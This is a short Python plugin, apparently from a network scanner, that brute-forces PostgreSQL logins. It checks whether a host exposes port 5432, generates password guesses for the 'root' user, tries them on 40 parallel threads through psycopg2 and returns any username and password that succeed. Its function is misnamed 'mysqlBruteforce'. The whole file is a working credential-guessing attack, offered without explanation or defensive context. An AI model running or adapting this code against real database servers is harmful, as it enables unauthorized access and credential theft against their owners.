from lib.verify import verify, GetHosts
import concurrent.futures
import psycopg2

vuln = ['postgresql', '5432']
user = ['root']
result = ''


def mysqlBruteforce(task):
    global result
    address, username, password = task.split('|')
    try:
        conn = psycopg2.connect(host=address, port=5432, user=username, password=password)
        result = 'Postgresql User: ' + username + ' Pass: ' + password
    except:
        pass


def check(ip, ports, apps):
    global result
    if verify(vuln, ports, apps):
        hosts = GetHosts(ip, user)
        with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executor:
            executor.map(mysqlBruteforce, hosts)
    return result
